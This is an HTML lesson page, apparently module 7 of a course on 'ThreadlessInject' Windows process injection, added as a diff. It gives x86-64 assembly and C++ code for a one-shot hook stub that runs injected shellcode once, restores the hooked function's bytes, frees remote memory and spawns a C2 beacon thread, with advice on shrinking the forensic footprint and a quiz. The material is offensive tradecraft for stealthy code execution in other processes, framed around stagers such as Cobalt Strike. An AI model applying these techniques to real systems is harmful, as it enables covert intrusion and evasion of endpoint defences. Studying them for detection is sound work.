@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 7: Shellcode Execution &amp; Cleanup - ThreadlessInject Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F9F5;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#14b8a6;--accent2:#0d9488;--gradient:linear-gradient(135deg,#14b8a6,#0d9488)}</style>
+</head>
+<body>
+
+<button class="hamburger" onclick="document.querySelector('nav').classList.toggle('open')">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>ThreadlessInject Course</h2>
+<span>Threadless Injection Masterclass</span>
+</div>
+<a class="home-link" href="../ThreadlessInject_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span class="diff d1">1</span> Thread Creation Problem</a>
+<a class="mod-link" href="module2.html"><span class="diff d1">2</span> Remote Function Hooking</a>
+<a class="mod-link" href="module3.html"><span class="diff d1">3</span> Target Function Selection</a>
+<a class="mod-link" href="module4.html"><span class="diff d2">4</span> Remote Memory Allocation</a>
+<a class="mod-link" href="module5.html"><span class="diff d2">5</span> Hook Stub Architecture</a>
+<a class="mod-link" href="module6.html"><span class="diff d2">6</span> Installing Remote Hook</a>
+<a class="mod-link active" href="module7.html"><span class="diff d3">7</span> Execution &amp; Cleanup</a>
+<a class="mod-link" href="module8.html"><span class="diff d3">8</span> Full Chain &amp; Detection</a>
+</nav>
+
+<main>
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 7: Shellcode Execution &amp; Cleanup</h1>
+<p class="subtitle">One-shot execution: run the payload once, then restore the hook and vanish.</p>
+
+<div class="card highlight">
+<h4>The One-Shot Problem</h4>
+<p>ThreadlessInject is designed as a <strong>one-shot</strong> injection mechanism. The hook should fire once, execute the shellcode payload, and then clean itself up so the hooked function returns to normal. If the hook stays active, the shellcode runs every time the function is called, which creates problems: repeated execution of initialization shellcode (like a Cobalt Strike stager) will crash or behave incorrectly, the added latency on every call degrades performance, and the persistent hook is a detection artifact.</p>
+</div>
+
+<h2>Why One-Shot Matters</h2>
+<p>Most shellcode payloads (stagers, loaders, implant bootstraps) are designed to run exactly once. They perform initialization, spawn their own thread for the C2 communication loop, and return. If the hook stub calls the shellcode every time the hooked function is called, you get multiple initializations, multiple C2 connections, and likely crashes from double-initialization of global state.</p>
+
+<table>
+<tr><th>Scenario</th><th>Persistent Hook</th><th>One-Shot Hook</th></tr>
+<tr><td>Shellcode execution count</td><td>Every call to hooked function</td><td>Exactly once</td></tr>
+<tr><td>C2 connections</td><td>Multiple (one per trigger)</td><td>Single</td></tr>
+<tr><td>Process stability</td><td>Degrades over time</td><td>Returns to normal</td></tr>
+<tr><td>Detection window</td><td>Permanent hook artifact</td><td>Brief, then clean</td></tr>
+<tr><td>Performance impact</td><td>Continuous overhead</td><td>One-time delay</td></tr>
+</table>
+
+<h2>The Execution Guard: Preventing Re-Execution</h2>
+<p>ThreadlessInject uses a simple but effective mechanism to ensure one-shot execution: an <strong>execution guard flag</strong> stored in the allocated memory region. The hook stub checks this flag before calling the shellcode. On the first execution, the flag is clear, so the shellcode runs. The shellcode (or the stub itself) then sets the flag, and all subsequent invocations of the hook skip the shellcode call.</p>
+
+<pre><code><span class="lang-tag">x86-64 ASM</span>; Modified hook stub with execution guard
+hook_stub:
+    ; Check the execution guard (a DWORD at a known offset in our memory region)
+    ; The guard is initialized to 0 by the injector
+    lea rax, [rip + guard_offset]   ; Load address of guard variable
+    lock cmpxchg [rax], ecx         ; Atomically check and set
+    ; Alternative simpler approach:
+    mov eax, [rip + guard_offset]   ; Read guard flag
+    test eax, eax                   ; Is it zero?
+    jnz skip_shellcode              ; If non-zero, skip shellcode (already executed)
+
+    ; Set the guard to 1 (prevent future executions)
+    mov dword ptr [rip + guard_offset], 1
+
+    ; Save registers (same as Module 5)
+    push rax
+    push rcx
+    ; ... (all registers saved)
+    pushfq
+
+    ; Align stack and call shellcode
+    mov rbp, rsp
+    and rsp, 0xFFFFFFF0
+    sub rsp, 0x20
+    mov rax, shellcode_addr
+    call rax
+
+    ; Restore registers
+    mov rsp, rbp
+    popfq
+    ; ... (all registers restored)
+    pop rax
+
+skip_shellcode:
+    ; Execute original bytes (always, regardless of guard)
+    ; [14 bytes of saved original prologue]
+
+    ; Jump back to hooked function + 14
+    jmp [rip + 0]
+    dq original_func_plus_14
+
+guard_offset:
+    dd 0    ; Initialized to 0, set to 1 after first execution</code></pre>
+
+<div class="card">
+<h4>Atomic Guard with LOCK CMPXCHG</h4>
+<p>For true thread safety, the guard check should be atomic. Multiple threads might call the hooked function simultaneously, and we need to guarantee that only one thread executes the shellcode. The <code>LOCK CMPXCHG</code> instruction performs an atomic compare-and-swap: it checks if the guard is 0, and if so, sets it to 1 in a single atomic operation. Only the thread that successfully changes the guard from 0 to 1 proceeds to execute the shellcode; all other threads see the guard is already 1 and skip.</p>
+</div>
+
+<h2>Self-Restoration: Unhooking After Execution</h2>
+<p>The most thorough cleanup approach is to restore the original function bytes after the shellcode executes. This removes the hook entirely, so the function returns to its original unmodified state. There are two ways to accomplish this:</p>
+
+<h3>Approach 1: Shellcode Restores the Hook</h3>
+<p>The shellcode itself can restore the original bytes. ThreadlessInject passes the necessary information (original function address, original bytes, byte count) to the shellcode, which uses <code>NtProtectVirtualMemory</code> and <code>memcpy</code> to restore the prologue:</p>
+
+<pre><code><span class="lang-tag">C++</span>// Shellcode-side restoration (running inside the target process)
+// The shellcode has been given pointers to the original bytes and target address
+
+void ShellcodeEntry(RESTORATION_INFO* info) {
+    // Step 1: Do the actual payload work (e.g., spawn beacon)
+    LoadAndExecutePayload();
+
+    // Step 2: Restore the hooked function's original bytes
+    ULONG oldProtect = 0;
+    PVOID addr = info-&gt;hookedFuncAddr;
+    SIZE_T size = 14;
+
+    // Make the code page writable again
+    NtProtectVirtualMemory(
+        GetCurrentProcess(), &amp;addr, &amp;size,
+        PAGE_EXECUTE_READWRITE, &amp;oldProtect
+    );
+
+    // Copy original bytes back over the hook JMP
+    memcpy(info-&gt;hookedFuncAddr, info-&gt;originalBytes, 14);
+
+    // Restore original protection
+    NtProtectVirtualMemory(
+        GetCurrentProcess(), &amp;addr, &amp;size,
+        oldProtect, &amp;oldProtect
+    );
+}</code></pre>
+
+<h3>Approach 2: Injector Monitors and Restores</h3>
+<p>Alternatively, the injector process can monitor for a signal that the shellcode has executed (e.g., by checking the guard flag in remote memory via <code>NtReadVirtualMemory</code>), then restore the original bytes from the injector side:</p>
+
+<pre><code><span class="lang-tag">C++</span>// Injector-side restoration (running in the attacker's process)
+// Poll the guard flag until shellcode has executed
+
+printf("[*] Waiting for shellcode execution...\n");
+
+DWORD guard = 0;
+while (guard == 0) {
+    NtReadVirtualMemory(hProcess, guardFlagAddr, &amp;guard, sizeof(guard), NULL);
+    Sleep(100);  // Check every 100ms
+}
+
+printf("[+] Shellcode executed! Restoring original bytes...\n");
+
+// Restore the original function prologue
+PVOID protAddr = (PVOID)hookedFuncAddr;
+SIZE_T protSize = 14;
+ULONG oldProt = 0;
+
+NtProtectVirtualMemory(hProcess, &amp;protAddr, &amp;protSize,
+    PAGE_EXECUTE_READWRITE, &amp;oldProt);
+
+NtWriteVirtualMemory(hProcess, (PVOID)hookedFuncAddr,
+    originalBytes, 14, NULL);
+
+NtProtectVirtualMemory(hProcess, &amp;protAddr, &amp;protSize,
+    oldProt, &amp;oldProt);
+
+printf("[+] Hook removed, original function restored.\n");</code></pre>
+
+<div class="diagram">
+<h4>One-Shot Execution Timeline</h4>
+<div class="flow" style="flex-direction:column;gap:4px;align-items:stretch;max-width:600px;margin:0 auto">
+<div class="box" style="width:100%"><strong>T0</strong>: Hook installed, guard = 0, waiting for trigger</div>
+<div class="box hl" style="width:100%"><strong>T1</strong>: Thread A calls hooked function, guard is 0 &rarr; shellcode executes</div>
+<div class="box y" style="width:100%"><strong>T2</strong>: Guard set to 1, shellcode spawns implant thread</div>
+<div class="box" style="width:100%"><strong>T3</strong>: Thread B calls hooked function, guard is 1 &rarr; shellcode skipped</div>
+<div class="box g" style="width:100%"><strong>T4</strong>: Original bytes restored, hook removed entirely</div>
+<div class="box g" style="width:100%"><strong>T5</strong>: Function back to normal, no artifacts remain in prologue</div>
+</div>
+</div>
+
+<h2>Memory Cleanup</h2>
+<p>After the hook is removed and the original function is restored, the allocated memory region (containing the hook stub and shellcode) remains in the target process. For a simple stager that spawns its own long-running thread, this is acceptable &mdash; the stager code is no longer needed, but freeing it while the spawned thread might still reference it could cause issues.</p>
+
+<p>For a thorough cleanup, you can optionally free the memory:</p>
+
+<pre><code><span class="lang-tag">C++</span>// Optional: Free the hook stub + shellcode memory
+// Only safe if shellcode has fully bootstrapped and no longer needs the region
+PVOID freeAddr = remoteBase;
+SIZE_T freeSize = 0;  // 0 means release the entire region
+
+NtFreeVirtualMemory(
+    hProcess,
+    &amp;freeAddr,
+    &amp;freeSize,
+    MEM_RELEASE
+);
+// The remote memory region is now freed
+// Warning: only do this if the shellcode has completed bootstrapping</code></pre>
+
+<div class="card warn">
+<h4>Cleanup Trade-offs</h4>
+<p>Freeing the remote memory is ideal for stealth but risky for stability. If the shellcode allocated any structures that point back into the hook region, or if the shellcode spawned a thread that occasionally references it, freeing the memory causes a use-after-free crash. In practice, many operators leave the memory allocated (it is small, typically a few kilobytes) and accept the minor forensic artifact. The hook stub memory in RX protection without a backing image file is itself a detection vector, but it is less conspicuous than an active hook on a function prologue.</p>
+</div>
+
+<h2>Handling Shellcode That Blocks</h2>
+<p>Some shellcode payloads block (run for a long time or indefinitely) rather than quickly spawning a thread and returning. If your shellcode blocks, the thread that triggered the hook is stuck in the shellcode and never returns to the hooked function. This means:</p>
+
+<ul>
+<li>The thread that triggered the hook is hijacked permanently (or until the shellcode exits).</li>
+<li>The hooked function is effectively unavailable for that thread, potentially breaking the target application.</li>
+<li>The hook is never restored (if relying on the shellcode to restore it).</li>
+</ul>
+
+<p>For this reason, well-designed shellcode for threadless injection should follow the pattern: spawn a new thread (or work item) for the long-running C2 loop, then return control to the hook stub immediately. This way, the hijacked thread resumes its normal operation within milliseconds.</p>
+
+<pre><code><span class="lang-tag">C++</span>// Good shellcode pattern for threadless injection:
+// Spawn a worker thread for the long-running payload, then return quickly
+
+void ShellcodeEntry() {
+    // Quickly bootstrap: resolve CreateThread, allocate implant memory, etc.
+    pCreateThread CreateThread = ResolveAPI("kernel32.dll", "CreateThread");
+
+    // Spawn the long-running C2 loop on a new thread
+    CreateThread(NULL, 0, BeaconMainLoop, NULL, 0, NULL);
+
+    // Return immediately so the hook stub can restore registers
+    // and resume the hooked function
+    return;
+}
+// Total time on the hijacked thread: ~1ms for the bootstrap</code></pre>
+
+<div class="card green">
+<h4>The Clean State After Execution</h4>
+<p>When the one-shot pattern works correctly, the end state is remarkably clean: the shellcode has spawned its implant on a new thread (which looks like any other thread to the OS), the hooked function has been restored to its original bytes, and the only remaining artifact is the allocated memory region containing the now-inactive hook stub. Compare this to traditional injection where a thread exists whose start address points to <code>VirtualAllocEx</code>'d memory &mdash; ThreadlessInject's forensic footprint is substantially smaller.</p>
+</div>
+
+<div class="quiz" id="quiz7">
+<h4>Pop Quiz: Execution &amp; Cleanup</h4>
+<div class="quiz-q" data-correct="1">
+<p>Q1: Why is one-shot execution important for ThreadlessInject?</p>
+<label data-opt="0"><input type="radio" name="q7_0"> Shellcode can only execute once due to Windows memory protection</label>
+<label data-opt="1"><input type="radio" name="q7_0"> Most shellcode payloads (stagers, loaders) are designed for single initialization and will crash or misbehave if run multiple times</label>
+<label data-opt="2"><input type="radio" name="q7_0"> The CPU instruction cache cannot handle repeated execution</label>
+<label data-opt="3"><input type="radio" name="q7_0"> Windows limits each memory region to one execution</label>
+<div class="explain">Shellcode payloads like Cobalt Strike stagers perform one-time initialization: resolving API addresses, establishing C2 connections, allocating global structures. Running this initialization multiple times causes duplicate connections, double-free bugs, or corruption of global state. The one-shot pattern ensures the shellcode runs exactly once.</div>
+</div>
+<div class="quiz-q" data-correct="0">
+<p>Q2: How does LOCK CMPXCHG help with the execution guard?</p>
+<label data-opt="0"><input type="radio" name="q7_1"> It atomically checks if the guard is 0 and sets it to 1, ensuring only one thread executes the shellcode even under concurrent access</label>
+<label data-opt="1"><input type="radio" name="q7_1"> It locks the memory page so no other process can access it</label>
+<label data-opt="2"><input type="radio" name="q7_1"> It compresses the exchange for faster execution</label>
+<label data-opt="3"><input type="radio" name="q7_1"> It is required by Windows for all memory writes in shared regions</label>
+<div class="explain">LOCK CMPXCHG performs an atomic compare-and-swap. It reads the guard, compares it to 0, and if they match, writes 1 &mdash; all in a single atomic operation. If two threads hit the hook simultaneously, only one will see the guard as 0 and set it to 1; the other will see 1 and skip the shellcode.</div>
+</div>
+<div class="quiz-q" data-correct="2">
+<p>Q3: Why should shellcode for threadless injection spawn a new thread and return quickly?</p>
+<label data-opt="0"><input type="radio" name="q7_2"> Windows requires all injected code to run on a separate thread</label>
+<label data-opt="1"><input type="radio" name="q7_2"> The hook stub has a built-in timeout that kills long-running shellcode</label>
+<label data-opt="2"><input type="radio" name="q7_2"> Blocking shellcode hijacks the triggering thread permanently, preventing the hooked function from returning and potentially breaking the target application</label>
+<label data-opt="3"><input type="radio" name="q7_2"> New threads execute shellcode faster due to fresh stack space</label>
+<div class="explain">The hook runs on an existing thread that was about to call the hooked function. If the shellcode blocks (e.g., enters a C2 loop), that thread never returns from the function call. This means whatever the thread was doing (processing messages, handling connections, etc.) stops, which can break the target application. By spawning a new thread for the long-running work and returning immediately, the existing thread resumes its normal duties.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz7')">Check Answers</button>
+<div class="quiz-result"></div>
+</div>
+
+<div class="nav-btns">
+<a href="module6.html">&larr; Previous: Installing Remote Hook</a>
+<a class="primary" href="module8.html">Next: Full Chain &amp; Detection &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
